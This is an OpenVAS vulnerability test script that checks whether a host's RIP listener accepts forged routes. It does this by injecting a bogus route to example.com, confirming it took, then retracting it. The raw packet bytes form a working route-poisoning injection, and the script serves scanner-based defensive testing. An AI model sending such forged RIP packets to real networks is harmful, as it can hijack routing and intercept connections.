# OpenVAS Vulnerability Test
# $Id: rip_poison.nasl 17 2013-10-27 14:01:43Z jan $
# Description: RIP poisoning
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# with help from Pavel Kankovsky.
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to poison the remote host routing tables through
the RIP protocol.
An attacker may use this to hijack network connections.";

tag_solution = "use RIP-2 and implement authentication,
	or use another routing protocol,
	or disable the RIP listener if you don't need it.";

# References:
# RFC 1058	Routing Information Protocol
# RFC 2453	RIP Version 2
#
# Notes:
# routed from OpenBSD or Linux rejects routes that are not sent by a neighbour

if(description)
{
  script_id(11829);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  name = "RIP poisoning";
  script_name(name);
 
  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;
  script_description(desc);
 
  summary = "Poison routing tables through RIP";
  script_summary(summary);
# This plugin is not supposed to be dabgerous but it was released as 
# ACT_DESTRUCTIVE_ATTACK because we could not be 100% sure that there 
# were no really broken RIP implementation somewhere in the cyberspace. 
# Looks OK now.
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("General");
  script_dependencies("rip_detect.nasl");
  script_require_keys("Services/udp/rip");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##include("dump.inc");

port = get_kb_item("Services/udp/rip");
if (! port) port = 520;

#if (! get_udp_port_state(port)) exit(0); # Not very efficient with UDP!

a1 = 192; a2 = 0; a3 = 34; a4 =  166;	# example.com

function check_example_com()
{
  local_var	r, l, ver, i, soc, broken; 
  
  broken = get_kb_item("/rip/" + port + "/broken_source_port");
  if (broken)
    soc = open_priv_sock_udp(dport:port, sport:port);
  else
    soc = open_sock_udp(port);
  if (!soc) return(0);

  # Special request - See �3.4.1 of RFC 1058
  req = raw_string(1, 1, 0, 0, 0, 0, 0, 0, 
		0, 0, 0, 0,
		0, 0, 0, 0,
		0, 0, 0, 0,
		0, 0, 0, 16);
  send(socket: soc, data: req);
  r = recv(socket:soc, length: 512);
  ##dump(ddata: r, dtitle: "routed");

  close(soc);
  l = strlen(r);
  if (l < 4 || ord(r[0]) != 2) return (0);	# Not a RIP answer
  ver = ord(r[1]); 
  if (ver != 1 && ver != 2) return (0);	# Not a supported RIP version?

  for (i = 4; i < l; i += 20)
  {
    fam = 256 * ord(r[i]) + ord(r[i+1]);
    if (fam == 2)
      if (ord(r[i+4]) == a1 && ord(r[i+5]) == a2
	&& ord(r[i+6]) == a3  && ord(r[i+7]) == a4 # Addr
# We ignore route which have 'infinite' length
	&& ord(r[i+16]) == 0 && ord(r[i+17]) == 0 
	&& ord(r[i+18]) == 0 && ord(r[i+19]) != 16) # Hops
        return 1;
  }
  return 0;
}

if (check_example_com()) exit(0);	# Routing table is weird

soc = open_priv_sock_udp(sport: 520, dport: 520);
if (! soc) exit(0);


req = raw_string(2, 1, 0, 0, 
		0, 2, 0, 0, 
		a1, a2, a3, a4,
		0, 0, 0, 0,
		0, 0, 0, 0,
		0, 0, 0, 14);	# Hops - limit the propagation of the bogus route
# Maybe we should use the result of traceroute to set the right number?

send(socket: soc, data: req);
##close(soc);

if (check_example_com())
{
  security_hole(port: port, protocol: "udp");
  if (! islocalnet())
    security_hole(port: port, protocol: "udp", 
data: "Your RIP listener accepts routes that are not sent by a neighbour.
This cannot happen in the RIP protocol as defined by RFC2453, and 
although the RFC is silent on this point, such routes should probably 
be ignored.

A remote attacker might use this flaw to access your local network, if
it is not protected by a properly configured firewall.

Solution: reconfigure your RIP listener if possible
	or use another routing protocol,
	or disable the RIP listener if you don't need it.");

# Fix it: set the number of hops to "infinity".

  req = raw_string(2, 1, 0, 0, 
		0, 2, 0, 0, 
		a1, a2, a3, a4,
		0, 0, 0, 0,
		0, 0, 0, 0,
		0, 0, 0, 16);	# Hops
  send(socket: soc, data: req);
}

close(soc);

##if (! check_example_com()) display("Fixed!\n");
